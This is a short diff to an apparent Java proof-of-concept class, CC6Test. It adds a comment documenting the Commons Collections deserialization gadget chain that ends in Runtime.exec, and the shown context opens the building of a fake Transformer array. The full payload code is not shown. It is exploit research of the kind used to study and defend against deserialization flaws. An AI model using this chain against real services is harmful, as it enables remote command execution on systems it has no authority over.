@@ -16,6 +16,21 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 
+/**
+ * Gadget chain:
+ * 	    java.io.ObjectInputStream.readObject()
+ *             java.util.HashSet.readObject()
+ *                 java.util.HashMap.put()
+ *                 java.util.HashMap.hash()
+ *                     org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+ *                     org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+ *                         org.apache.commons.collections.map.LazyMap.get()
+ *                             org.apache.commons.collections.functors.ChainedTransformer.transform()
+ *                             org.apache.commons.collections.functors.InvokerTransformer.transform()
+ *                             java.lang.reflect.Method.invoke()
+ *                                 java.lang.Runtime.exec()
+ */
+
 public class CC6Test {
     public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
         Transformer[] fake = new Transformer[]{
